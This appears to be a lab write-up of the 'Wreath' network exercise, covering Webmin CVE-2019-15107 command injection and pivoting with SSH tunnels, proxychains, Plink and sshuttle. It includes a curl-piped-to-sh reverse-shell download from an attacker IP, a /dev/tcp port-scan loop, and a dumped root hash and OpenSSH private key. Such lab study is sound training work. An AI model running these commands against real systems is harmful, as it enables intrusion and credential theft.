## Overview - objectives
- Pivoting
- Working with the Empire C2 framework
- Simple AV evasion techniques

*Please upload files/shells in the format: `toolname-username`*

## Brief
*There are **two machines on my home network that host projects and stuff** I'm working on in my own time -- one of them has a webserver that's port forwarded, so that's your way in if you can find a vulnerability! It's serving a website that's pushed to ==my git server from my own PC for version control==, then cloned to the public facing server. See if you can get into these! My own PC is also on that network, but I doubt you'll be able to get into that as it has protections turned on, doesn't run anything vulnerable, and can't be accessed by the public-facing section of the network. Well, I say PC -- it's technically a repurposed server because I had a spare license lying around, but same difference.*

## Enumeration
Nmap scan showed:<br>
<br>Discovered open port 443/tcp on 10.200.84.200
<br>Discovered open port 22/tcp on 10.200.84.200
<br>Discovered open port 80/tcp on 10.200.84.200
<Br>Discovered open port 10000/tcp on 10.200.84.200

DNS wasn't set properly so we had to add it into our hosts file.

Quick glance on webpage disclosed some basic information: <br>
<br>Phone number: 01347 822945
<br>Mobile number: +447821548812
<br>Email: me@thomaswreath.thm

Service check (-sV) for port 10000 pointed us to `MiniServ 1.890 (Webmin httpd)` which current version has a public exploit `CVE-2019-15107` - https://www.rapid7.com/db/vulnerabilities/http-webmin-cve-2019-15107/

![image](https://github.com/0xScorpio/Ethical-Hacking/assets/140411254/88c4fc88-326c-4bc3-831c-9e6b70c2c74a)


The exploit itself allows for command injection - and unfortunately, directly as root:

![image](https://github.com/0xScorpio/Ethical-Hacking/assets/140411254/cb2e2ba0-854c-411f-909b-cfe4c35179b5)

## Exploitation

Since the CVE exploit script runs per session, we can only place one command at a time. Due to this, we can't just place a reverse shell as a command directly, but instead, we can pull and run the reverse shell script with curl.

First, I set up a ==Perl reverse shell script== locally after confirming binaries existed on the victim machine.

And then set up a listener.
Then, I set up a quick Python web server and on the victim machine to pull and run the reverse shell:

```bash
curl 10.50.85.129:6969/PerlRev.pl | sh
```

![image](https://github.com/0xScorpio/Ethical-Hacking/assets/140411254/58a5f9a5-1fe4-4fcd-8768-34fc0319103e)


After stabilizing the shell - (https://github.com/0xScorpio/Ethical-Hacking/blob/main/README.md#reverse-shell-stabilization), we can check for the root user's password hash, for persistence:

![image](https://github.com/0xScorpio/Ethical-Hacking/assets/140411254/684b7c9d-3622-4ad3-af8a-4e600c891661)


`root:$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1`

Root hash is uncrackable, so let's check what we can find in the root folder. It looks like SSH keys are stored, which is perfect for us - we can SSH whenever we want to.

```sshkey
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```


Like most traditional corporate architectures, Wreath has a similar setup with his 3 machines:

Therefore, to move past the public-facing web server and into the internal network, we'll need to pivot.

## Pivoting

There are 2 main methods within pivoting:
- ==**Tunnelling/Proxying:**== Creating a proxy type connection through a compromised machine in order to route all desired traffic into the targeted network. This could potentially also be _tunnelled_ inside another protocol (e.g. SSH tunnelling), which can be useful for evading a basic **I**ntrusion **D**etection **S**ystem (IDS) or firewall.
- **==Port Forwarding:==** Creating a connection between a local port and a single port on a target, via a compromised host.

Either option will require further enumeration in order to decide which technique is best for our environment.

There are 5 possible ways to enumerate a network through a compromised host:
1. Material found on the machine - hosts file or ARP cache
2. Pre-installed tools
3. Statically compiled tools (https://github.com/andrew-d/static-binaries?tab=readme-ov-file)
4. Scripting techniques
5. Local tools via proxy

*When we're trying to use the binary on a target system we will nearly always need a statically compiled copy of the program, as the system may not have the dependencies installed, meaning that a dynamic binary would be unable to run.*

```bash
[root@prod-serv ~]# arp -a
ip-10-200-84-1.eu-west-1.compute.internal (10.200.84.1) at 02:f3:70:5f:3a:e7 [ether] on eth0
```

```bash
[root@prod-serv ~]# cat /etc/hosts
127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
::1         localhost localhost.localdomain localhost6 localhost6.localdomain6
```

```bash
[root@prod-serv ~]# cat /etc/resolv.conf
# Generated by NetworkManager
search eu-west-1.compute.internal
nameserver 10.200.0.2
```

```bash
[root@prod-serv ~]# nmcli dev show
GENERAL.DEVICE:                         eth0
GENERAL.TYPE:                           ethernet
GENERAL.HWADDR:                         02:15:6E:C3:4F:D5
GENERAL.MTU:                            9001
GENERAL.STATE:                          100 (connected)
GENERAL.CONNECTION:                     eth0
GENERAL.CON-PATH:                       /org/freedesktop/NetworkManager/ActiveConnection/1
WIRED-PROPERTIES.CARRIER:               on
IP4.ADDRESS[1]:                         10.200.84.200/24
IP4.GATEWAY:                            10.200.84.1
IP4.ROUTE[1]:                           dst = 0.0.0.0/0, nh = 10.200.84.1, mt = 100
IP4.ROUTE[2]:                           dst = 10.200.84.0/24, nh = 0.0.0.0, mt = 100
IP4.DNS[1]:                             10.200.0.2
IP4.DOMAIN[1]:                          eu-west-1.compute.internal
IP6.ADDRESS[1]:                         fe80::15:6eff:fec3:4fd5/64
IP6.GATEWAY:                            --
IP6.ROUTE[1]:                           dst = ff00::/8, nh = ::, mt = 256, table=255
IP6.ROUTE[2]:                           dst = fe80::/64, nh = ::, mt = 256

GENERAL.DEVICE:                         lo
GENERAL.TYPE:                           loopback
GENERAL.HWADDR:                         00:00:00:00:00:00
GENERAL.MTU:                            65536
GENERAL.STATE:                          10 (unmanaged)
GENERAL.CONNECTION:                     --
GENERAL.CON-PATH:                       --
IP4.ADDRESS[1]:                         127.0.0.1/8
IP4.GATEWAY:                            --
IP6.ADDRESS[1]:                         ::1/128
IP6.GATEWAY:                            --
IP6.ROUTE[1]:                           dst = ::1/128, nh = ::, mt = 256
```

```bash
[root@prod-serv ~]# for i in {1..255}; do (ping -c 1 10.200.84.${i} | grep "bytes from" &); done
64 bytes from 10.200.84.1: icmp_seq=1 ttl=255 time=0.353 ms
64 bytes from 10.200.84.200: icmp_seq=1 ttl=64 time=0.056 ms
64 bytes from 10.200.84.250: icmp_seq=1 ttl=64 time=0.642 ms
```

After doing the ping sweep, we can see 10.200.84.250 as another server. Running a port scan, we get:

```bash
[root@prod-serv ~]# for i in {1..65535}; do (echo > /dev/tcp/10.200.84.250/$i) >/dev/null 2>&1 && echo $i is open; done
22 is open
1337 is open
```

*Finally, the dreaded scanning through a proxy. This should be an absolute last resort, as scanning through something like proxychains is very slow, and often limited (you cannot scan UDP ports through a TCP proxy, for example). The one exception to this rule is when using the Nmap Scripting Engine (NSE), as the scripts library does not come with the statically compiled version of the tool. As such, you can use a static copy of Nmap to sweep the network and find hosts with open ports, then use your local copy of Nmap through a proxy specifically against the found ports.*

There are 2 specific tools for this:
- Proxychains (use this if you're stuck with terminals)
- FoxyProxy (use this if you're working with a web app)

==Proxychains== is a command line tool which is activated by prepending the command proxychains to other commands. For example, to proxy netcat  through a proxy, you could use the command:

```
proxychains nc 172.16.0.10 23
```

Notice that a proxy port was not specified in the above command. This is because proxychains reads its options from a config file. The master config file is located at /etc/proxychains.conf. This is where proxychains will look by default; however, it's actually the last location where proxychains will look. The locations (in order) are:

- The current directory --> (./proxychains.conf)
- Home directory --> (~/.proxychains/proxychains.conf)
- Absolute path --> (/etc/proxychains.conf)

We primarily care about the [ProxyList] section.
*The 'Proxy DNS' section can cause an NMAP scan to hang if it is not commented out!!!*

Things to note about proxychains:
- IT IS SLOWWWWW
- Can only use TCP scans. No UDP, SYN or ICMP, so make sure to use the -Pn flag.

## Forward Connections

Creating a forward (or "local") SSH tunnel can be done from our attacking box ==when we have SSH access to the target.== As such, this technique is much more commonly used against Unix hosts. Linux servers, in particular, commonly have SSH active and open. That said, Microsoft (relatively) recently brought out their own implementation of the OpenSSH server, native to Windows, so this technique may begin to get more popular in this regard if the feature were to gain more traction.

- PORT FORWARDING: 

```bash
ssh -L 8989:INTERNAL-TARGET-IP:INTERNAL-TARGET-PORT user@COMPROMISED-TARGET-IP -fN
```

Using this, we can ==access the website on the INTERNAL-TARGET-IP by navigating to port 8989 on our own attacking machine. (localhost:8989)== -f backgrounds the shell immediately and -N tells SSH that it doesn't need to execute any commands - only set up a connection.

- PROXIES:

```bash
ssh -D 1337 user@COMPROMISED-TARGET-IP -fN
```

This will open up port 1337 on our attacking machine as a proxy to send data through. This is useful when combined with ProxyChains.

## Reverse Connections

Ideal when you have a ==shell on the compromised server but NOT ssh access.== They are riskier since you must access your attacker machine *through* the target. Therefore a few steps need to be done before we create a reverse connection safely:

1.  First, generate a new set of SSH keys and store them somewhere safe:

```bash
ssh-keygen
```

2. Copy the contents of the public key and place it in the authorized_keys file (you might have to re-create the files). It should similar to this:

```bash
command="echo 'This account can only be used for port forwarding!'",no-agent-forwarding,no-x11-forwarding,no-pty ssh-ed25519 [REDACTED-FOR-PRIVACY----HASH-----] scorpio@anarchy
```

3.  Ensure that the SSH server on your attacking machine is running:

```bash
sudo systemctl status ssh
sudo systemctl start ssh
```

All that's left is to ==transfer the PRIVATE KEY to the TARGET machine!== This is not the 'best practice' as an attacker, which is why we created these steps to generate 'throw-away' SSH keys. Make sure to delete these keys once the engagement is over!

Once the PRIVATE KEY is transferred, we can connect back with a reverse port forward using this command on the COMPROMISED-TARGET-IP machine:

```bash
ssh -R 8989:INTERNAL-TARGET-IP:INTERNAL-TARGET-PORT USER@ATTACKER-IP -i KEYFILE -fN
```

### Closing pivoting connections

To close any of these connections, type ```ps aux | grep ssh``` into the terminal of the machine that created the connection, find the Process ID and ```sudo kill PID``` .

### Plink.exe

is a Windows command line version of the PuTTY SSH client.

Generally speaking, Windows servers are unlikely to have an SSH server running so our use of Plink tends to be a case of transporting the binary to the target, then using it to create a reverse connection. This would be done with the following command:

```cmd
cmd.exe /c echo y | .\plink.exe -R ATTACKER-PORT:INTERNAL-TARGET-IP:INTERNAL-TARGET-PORT user@ATTACKER-IP -i KEYFILE -N
```

Note that any keys generated by `ssh-keygen` will not work properly here. You will need to convert them using the `puttygen` tool, which can be installed on Kali using `sudo apt install putty-tools`. After downloading the tool, conversion can be done with:  

```puttygen KEYFILE -o OUTPUT_KEY.ppk```

***Plink.exe is notorious for going out-of-date quickly - so make sure to update!

### Socat (incomplete)
### Chisel (incomplete)

Set up a tunnelled proxy or port forward through a compromised system, regardless of the existence of SSH access. Written in Golang and can be easily compiled for any system.

**You must have an appropriate copy of the chisel binary on BOTH the attacking machine and compromised machine!

### Sshuttle

uses an SSH connection to create a tunnelled proxy that acts like a new interface. 

In short, it simulates a VPN, allowing us to route our traffic through the proxy _without the use of proxychains_ (or an equivalent). We can just directly connect to devices in the target network as we would normally connect to networked devices. 

As it creates a tunnel through SSH (the secure shell), anything we send through the tunnel is also encrypted, which is a nice bonus. ==We use sshuttle entirely on our attacking machine, in much the same way we would SSH into a remote server.==

**Only works on LINUX hosts! It also requires access to the compromised server via SSH, and Python also needs to be installed on the server!** 



